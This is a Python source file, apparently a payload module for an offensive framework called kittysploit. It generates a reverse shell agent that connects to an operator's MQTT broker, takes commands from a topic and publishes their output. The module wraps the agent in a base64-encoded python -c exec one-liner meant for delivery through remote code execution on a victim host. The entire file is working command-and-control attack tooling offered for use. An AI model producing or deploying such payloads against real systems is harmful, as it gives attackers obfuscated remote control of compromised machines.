from kittysploit import *
import base64

from lib.c2.mqtt_reverse_agent import build_mqtt_reverse_agent_script


class Module(Payload):
	"""MQTT reverse shell agent — deliverable via RCE like HTTP polling."""

	CLIENT_LANGUAGE = "python"

	__info__ = {
		"name": "Python MQTT Reverse Shell",
		"description": (
			"Connect to an MQTT broker, subscribe to cmd topic, publish results "
			"(stdlib MQTT 3.1.1 — no paho required on target). "
			"Pairs with listeners/iot/reverse_mqtt_shell."
		),
		"category": PayloadCategory.CMD,
		"arch": Arch.PYTHON,
		"platform": Platform.MULTI,
		"listener": "listeners/iot/reverse_mqtt_shell",
		"handler": Handler.REVERSE,
		"session_type": SessionType.POLLING,
	}

	lhost = OptString("127.0.0.1", "MQTT broker host", True)
	lport = OptPort(1883, "MQTT broker port", True)
	client_id = OptString("", "Agent MQTT / session client ID", False)
	base_topic = OptString("kittysploit/c2", "Base topic (must match listener)", False)
	username = OptString("", "Broker username", False)
	password = OptString("", "Broker password", False)
	python_binary = OptString("python3", "Python on target", True)

	def generate(self):
		identity = None
		if hasattr(self, "_apply_implant_identity_options"):
			try:
				identity = self._apply_implant_identity_options()
			except Exception:
				identity = None
		cid = str(getattr(getattr(self, "client_id", None), "value", self.client_id) or "").strip()
		if identity and getattr(identity, "implant_id", None):
			cid = identity.implant_id
		elif not cid:
			cid = "mqtt1"

		script = build_mqtt_reverse_agent_script(
			str(self.lhost),
			int(self.lport),
			cid,
			base_topic=str(self.base_topic or "kittysploit/c2"),
			username=str(self.username or ""),
			password=str(self.password or ""),
		)
		encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
		py = str(self.python_binary)
		return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
